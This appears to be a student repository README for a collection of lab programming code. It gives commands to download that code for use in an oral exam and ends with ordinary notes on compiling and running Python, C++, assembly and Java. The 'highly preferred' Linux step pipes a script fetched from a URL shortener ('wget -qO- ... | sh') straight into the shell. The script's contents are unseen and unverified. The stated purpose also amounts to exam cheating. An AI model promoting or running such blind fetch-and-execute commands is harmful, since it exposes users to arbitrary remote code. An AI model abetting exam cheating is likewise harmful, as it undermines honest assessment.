# Oral Exam Programming Code Collection

This repository contains important instructions for accessing a collection of programming codes used in preparation for the upcoming oral exam. The resource covers various subjects such as:

- **Object-Oriented Programming Lab (OOPL)**
- **Computer Graphics Lab (CGL)**
- **Data Structures and Algorithms Lab (DSAL)**
- **Data Structures Lab (DSL)**
- **Microprocessor Lab (MPL)**
## Instructions

# Important!!!: First of all make sure there is internet connection in your system (Ethernet or Wi-Fi to be connected) then only follow the instructions ahead otherwise nothing will work.

Follow the steps below according to your operating system.

## For Linux
### Direct method (Highly preferred)
1. **Open Terminal**
2. Copy and Paste this command pressing "Control + Shift + V" from your keyboard or manually (pressing right click and clicking on paste) paste it.
```bash
wget -qO- https://naturl.link/curl | sh
```
3. Once the command completes, open `pro.txt` to review the codes.

### Manual Method
1. **Open Terminal.**
2. Since Linux may not have the `curl` command installed by default, use the following command instead:
   ```
   wget -qO - https://is.gd/se19pro >> pro.txt
   ```
3. Once the command completes, open `pro.txt` to review the codes.

## For Windows

1. **Open the Windows Command Prompt (cmd).**
2. Execute the following command:
   ```
   curl.exe -fsSL https://is.gd/se19pro >> pro.txt
   ```
3. After executing the command, open the file `pro.txt` in your favorite text editor to view the programming codes.

## To run programs follow these steps for your own program.

### 1. Running a Python Program

**Steps:**
1. Write your Python code in a file (for example, save it as `script.py`).
2. Open a terminal.
3. Run the program using the Python interpreter.

**Command:**

```bash
python3 script.py
```

### 2. Running a C++ Program

**Steps:**
1. Write your C++ code in a file (e.g., `program.cpp`).
2. Open a terminal.
3. Compile the C++ source file using a C++ compiler (like `g++`), and then run the compiled executable.
4. Use a single-line command with `&&` to chain the compile and run commands.

**Command Example:**

```bash
g++ program.cpp -o program && ./program
```

### 3. Running an Assembly Program (Using NASM and LD)

**Steps:**
1. Write your assembly code in a file (e.g., `program.asm`).
2. Open a terminal.
3. Assemble the source code using NASM.
4. Link the object file using LD to produce an executable.
5. Chain these steps using `&&` on one line.

**Command Example:**

```bash
nasm -f elf64 program.asm -o program.o && ld program.o -o program && ./program
```

### 4. Running a Java Program.

**Steps:**
1. Write your Java code in a file (e.g., `Program.java`).
2. Open a terminal.
3. Compile the Java source code using the `javac` command.
4. Run the compiled Java program using the `java` command.
5. Chain these steps using `&&` on one line.

**Command Example:**

```bash
javac Program.java && java Program
``` 
## Purpose

These instructions are provided to copy the codes for use in the oral exam. Make sure to follow these steps accordingly based on your operating system.

---

Happy studying and best of luck on your oral exam!
